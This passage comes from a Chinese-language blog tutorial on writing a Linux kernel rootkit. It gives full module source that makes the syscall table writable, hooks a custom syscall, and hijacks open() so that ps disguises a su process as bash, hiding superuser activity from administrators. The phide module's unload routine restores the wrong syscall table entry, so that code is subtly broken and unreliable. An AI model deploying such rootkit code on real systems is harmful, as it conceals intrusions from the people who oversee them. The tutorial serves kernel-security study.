*<span class="title">task</span>;</span></span><br><span class="line">    <span class="comment">/* tty struct */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">my_tty</span>;</span></span><br><span class="line">    <span class="comment">/* get current tty*/</span></span><br><span class="line">    my_tty = get_current_tty();</span><br><span class="line">    <span class="comment">/* placeholder to print full string to tty */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="comment">/* &lt;sched.h&gt; library method that iterates through list of processes from task_struct defined above */</span></span><br><span class="line">    for_each_process(task) &#123;</span><br><span class="line">        <span class="comment">/* compares the current process name (defined in task-&gt;comm) to the passed in name */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(task-&gt;comm, process_name) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* convert to string and put into name[] */</span></span><br><span class="line">            <span class="built_in">sprintf</span>(name, <span class="string">&quot;PID = %ld\n&quot;</span>, (<span class="keyword">long</span>)task_pid_nr(task));</span><br><span class="line">            <span class="comment">/* show result to user that called the syscall */</span></span><br><span class="line">            (my_tty-&gt;driver-&gt;ops-&gt;write)(my_tty, name, <span class="built_in">strlen</span>(name)+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建pname.h头文件：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_process_name</span><span class="params">(<span class="keyword">char</span> *process_name)</span></span>;</span><br></pre></td></tr></table></figure>
<p>创建Makefile：  </p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-y := pname.o</span><br></pre></td></tr></table></figure>
<p>回到/usr/src/linux-3.10.103目录，将pname目录添加到内核的Makefile中：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd ..</span><br><span class="line">$ vim Makefile</span><br></pre></td></tr></table></figure>
<p>找到core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/所在的行，将pname/目录添加到此行的末尾：  </p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ pname/</span><br></pre></td></tr></table></figure>
<p>这样在编译内核时，编译器就会将新创建的系统调用一起编译了。<br>将pname和sys_process_name添加到系统调用表中。如果用的是64位系统，那么需要添加到<code>syscall_64.tbl</code>文件的300到500之间（将64位和32位系统调用隔离开）。我用的是32位系统，添加在了<code>syscall_32.tbl</code>文件的结尾。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim arch&#x2F;x86&#x2F;syscalls&#x2F;syscall_32.tbl</span><br></pre></td></tr></table></figure>
<p>添加新的系统调用：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">351 i386   pname     sys_process_name</span><br></pre></td></tr></table></figure>
<p>将sys_process_name(char *process_name)添加到syscall头文件中。因为asmlinkage用于定义函数的哪些参数可以放在堆栈上，所以头文件的末尾必须添加函数的原型。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim include&#x2F;linux&#x2F;syscalls.h</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_process_name</span><span class="params">(<span class="keyword">char</span> *process_name)</span></span>;</span><br></pre></td></tr></table></figure>
<p>编译安装新内核并重启系统，这个在<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/10/21/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97/">前面的文章</a>中有介绍，这里就不再赘述。<br>测试新的pname系统调用，在任意一个用户目录，如/home/fanrong/hook/：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim testPname.c</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter process to find&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    strtok(name, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> status = syscall(<span class="number">351</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;System call returned %ld\n&quot;</span>, status);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>随便写一个能一直运行的小程序，如test.c：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译并执行它：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gcc test.c -o test</span><br><span class="line">$ .&#x2F;test &amp;</span><br><span class="line">$ gcc testPname.c -o testPname</span><br><span class="line">$ .&#x2F;testPname</span><br><span class="line">test</span><br><span class="line">PID &#x3D; 15756</span><br><span class="line">           System call returned 0</span><br></pre></td></tr></table></figure>
<p>该系统调用通过遍历进程列表发现了test进程，并通过TTY将其输出到调用它的终端上，最后成功退出。</p>
<h2 id="利用Rootkit-“钩取”-Pname"><a href="#利用Rootkit-“钩取”-Pname" class="headerlink" title="利用Rootkit “钩取” Pname"></a>利用Rootkit “钩取” Pname</h2><p>现在我们要以hook的形式来打造一个内核模块，而不是借助系统调用。<br>我们首先要做的事情就是找到系统调用表地址，因为一旦找到了这个地址，我们就能够对其进行相应的处理，进而hook系统调用了：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;boot&#x2F;System.map-3.10.103 | grep sys_call_table</span><br><span class="line">c16f71c0 R sys_call_table</span><br></pre></td></tr></table></figure>

<blockquote>
<p>有许多方法可以用来动态搜索sys_call_table，强烈建议使用这些方法而不是硬编码。然而，为了便于学习，这里就不那么讲究了。将来编写更高级的rootkit，让它也支持动态搜索能力。如果想了解这方面的知识并亲自尝试一下的话，建议阅读下面的文章： <a target="_blank" rel="noopener" href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/</a></p>
</blockquote>
<p>在/home/fanrong/hook/captainHook/目录中创建captainHook.c代码：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/cacheflush.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/pgtable_types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/highmem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;BruceFan&quot;</span>);</span><br><span class="line"><span class="comment">/* My sys_call_table address */</span></span><br><span class="line"><span class="comment">/* c16f71c0 R sys_call_table */</span></span><br><span class="line"><span class="keyword">void</span> **system_call_table_addr;</span><br><span class="line"><span class="comment">/* my custom syscall that takes process name */</span></span><br><span class="line"><span class="function">asmlinkage <span class="title">int</span> <span class="params">(*custom_syscall)</span> <span class="params">(<span class="keyword">char</span> *name)</span></span>;</span><br><span class="line"><span class="comment">/* hook */</span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">captain_hook</span><span class="params">(<span class="keyword">char</span> *play_here)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* do whatever here, but now we will just print to the dmesg log */</span></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Pname Syscall:HOOK! HOOK! HOOK! HOOK!...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> custom_syscall(play_here);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Make page writeable */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">make_rw</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = lookup_address(address, &amp;level); <span class="comment">/* pte points to the beginning address of a page table */</span></span><br><span class="line">    <span class="keyword">if</span> (pte-&gt;pte &amp; ~_PAGE_RW) &#123;</span><br><span class="line">        pte-&gt;pte |= _PAGE_RW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Make the page write protected */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">make_ro</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = lookup_address(address, &amp;level);</span><br><span class="line">    pte-&gt;pte = pte-&gt;pte &amp; ~_PAGE_RW;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">entry_point</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Captain Hook loaded successfully..\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* My sys_call_table address */</span></span><br><span class="line">    system_call_table_addr = (<span class="keyword">void</span> *)<span class="number">0xc16f71c0</span>;</span><br><span class="line">    <span class="comment">/* Replace custom syscall with the correct system call name (write, open, etc) to hook */</span></span><br><span class="line">    custom_syscall = system_call_table_addr[__NR_pname];</span><br><span class="line">    <span class="comment">/* Disable page protection */</span></span><br><span class="line">    make_rw((<span class="keyword">unsigned</span> <span class="keyword">long</span>)system_call_table_addr);</span><br><span class="line">    <span class="comment">/* Change syscall to our syscall function */</span></span><br><span class="line">    system_call_table_addr[__NR_pname] = captain_hook;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __exit <span class="title">exit_point</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Unloaded Captain Hook Successfully\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* Restore original system call */</span></span><br><span class="line">    system_call_table_addr[__NR_pname] = custom_syscall;</span><br><span class="line">    <span class="comment">/* Renable page protection */</span></span><br><span class="line">    make_ro((<span class="keyword">unsigned</span> <span class="keyword">long</span>)system_call_table_addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(entry_point);</span><br><span class="line">module_exit(exit_point);</span><br></pre></td></tr></table></figure>
<p>注意到<code>__NR_pname</code>，它代表数字，即pname的系统调用的编码。因为前面已经将该系统调用添加到<code>syscall_32.tbl</code>中，赋予了它一个数字、一个名称和一个函数名。在这里，用的就是它的名称（pname）。它将拦截pname系统调用，每成功一次就打印一次dmesg。<br>还需要创建一个Makefile文件：  </p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj-m += captainHook.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
<p>编译该模块：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br></pre></td></tr></table></figure>
<p>现在打开另一个终端，输入如下命令实时查看dmesg：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo watch &quot;dmesg | tail -20&quot;</span><br></pre></td></tr></table></figure>
<p>回到之前的终端上插入hook模块并测试：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo insmod captainHook.ko</span><br><span class="line">$ cd ..</span><br><span class="line">$ .&#x2F;testPname</span><br><span class="line">Enter process to find</span><br><span class="line">test</span><br><span class="line">PID &#x3D; 15756</span><br><span class="line">           System call returned 0</span><br><span class="line">$ sudo rmmod captainHook</span><br></pre></td></tr></table></figure>
<p>再查看另一个终端：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Captain Hook loaded successfully..</span><br><span class="line">Pname Syscall:HOOK! HOOK! HOOK! HOOK!...</span><br><span class="line">Unloaded Captain Hook Successfully</span><br></pre></td></tr></table></figure>
<p>成功地”钩取”了系统调用!</p>
<h2 id="对系统管理命令”ps”隐身"><a href="#对系统管理命令”ps”隐身" class="headerlink" title="对系统管理命令”ps”隐身"></a>对系统管理命令”ps”隐身</h2><p>现在要通过编程技术来实现对<code>ps</code>命令隐藏进程。首先，找到要隐藏进程的PID，并想清楚要让它伪装成哪个其他的进程。在本例中，将一个su进程伪装成bash进程，以便系统管理员看不到有人正在使用超级用户权限。</p>
<blockquote>
<p>Linux中的一切皆文件。例如“/proc/cpuinfo”文件存放的是CPU信息，内核版本位于“/proc/version”文件中。而“/proc/uptime”和“/proc/stat”文件则分别用来存放系统正常运行时间和空闲时间。当运行ps命令时，它实际上是打开进程的文件，以使用open()系统调用查看相关信息。当进程首次启动时，会使用系统调用write()将其写入具有相应PID的文件中。针对ps命令运行strace就能查找它们，或者查看它使用了哪些系统调用。</p>
</blockquote>
<p>在/home/fanrong/hook/phide/目录中创建phide.c代码：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/cacheflush.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/pgtable_types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/highmem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;BruceFan&quot;</span>);</span><br><span class="line"><span class="comment">/* My sys_call_table address */</span></span><br><span class="line"><span class="comment">/* c16f71c0 R sys_call_table */</span></span><br><span class="line"><span class="keyword">void</span> **system_call_table_addr;</span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="title">int</span> <span class="params">(*original_open)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">open_hijack</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* This hooks all OPEN sys calls and check to see what the path of the file being opened is.</span></span><br><span class="line"><span class="comment">     * Currently, the paths must be hard coded for the process you wish to hide, and the process you would like it to impersonate. */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(pathname, <span class="string">&quot;/proc/5874/status&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;PS PROCESS HIJACKED %s\n&quot;</span>, pathname);</span><br><span class="line">        <span class="comment">/* The new process location will be written into the syscall table for the open command,</span></span><br><span class="line"><span class="comment">         * causing it to open a different file than the one originaly requested. */</span></span><br><span class="line">        <span class="built_in">memcpy</span>(pathname, <span class="string">&quot;/proc/5882/status&quot;</span>, <span class="built_in">strlen</span>(pathname)+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (*original_open)(pathname, flags);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Make page writeable */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">make_rw</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = lookup_address(address, &amp;level); <span class="comment">/* pte points to the beginning address of a page table */</span></span><br><span class="line">    <span class="keyword">if</span> (pte-&gt;pte &amp; ~_PAGE_RW) &#123;</span><br><span class="line">        pte-&gt;pte |= _PAGE_RW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Make the page write protected */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">make_ro</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = lookup_address(address, &amp;level);</span><br><span class="line">    pte-&gt;pte = pte-&gt;pte &amp; ~_PAGE_RW;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* My sys_call_table address */</span></span><br><span class="line">    system_call_table_addr = (<span class="keyword">void</span> *)<span class="number">0xc16f71c0</span>;</span><br><span class="line">    <span class="comment">/* return the system call to its original state */</span></span><br><span class="line">    original_open = system_call_table_addr[__NR_open];</span><br><span class="line">    <span class="comment">/* Disable page protection */</span></span><br><span class="line">    make_rw((<span class="keyword">unsigned</span> <span class="keyword">long</span>)system_call_table_addr);</span><br><span class="line">    <span class="comment">/* Change syscall to our syscall function */</span></span><br><span class="line">    system_call_table_addr[__NR_open] = open_hijack;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Open psHook loaded successfully..\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __exit <span class="title">end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Restore original system call */</span></span><br><span class="line">    system_call_table_addr[__NR_pname] = original_open;</span><br><span class="line">    <span class="comment">/* Renable page protection */</span></span><br><span class="line">    make_ro((<span class="keyword">unsigned</span> <span class="keyword">long</span>)system_call_table_addr);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Unloaded Captain Hook Successfully\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(start);</span><br><span class="line">module_exit(end);</span><br></pre></td></tr></table></figure>
<p>复制前面使用的Makefile，同时将顶部的”captainHook.o”替换为“phide.o”，用make命令编译。<br>将phide模块插入内核前：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ps</span><br><span class="line">  PID TTY         TIME CMD</span><br><span class="line"> 5874 pts&#x2F;2   00:00:00 su</span><br><span class="line"> 5882 pts&#x2F;2   00:00:00 bash</span><br><span class="line">17526 pts&#x2F;2   00:00:00 ps</span><br></pre></td></tr></table></figure>
<p>将phide模块插入内核后：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ps</span><br><span class="line">  PID TTY         TIME CMD</span><br><span class="line"> 5882 pts&#x2F;2   00:00:00 bash</span><br><span class="line"> 5882 pts&#x2F;2   00:00:00 bash</span><br><span class="line">17526 pts&#x2F;2   00:00:00 ps</span><br></pre></td></tr></table></figure>
<p>实时查看dmesg的终端：  </p>
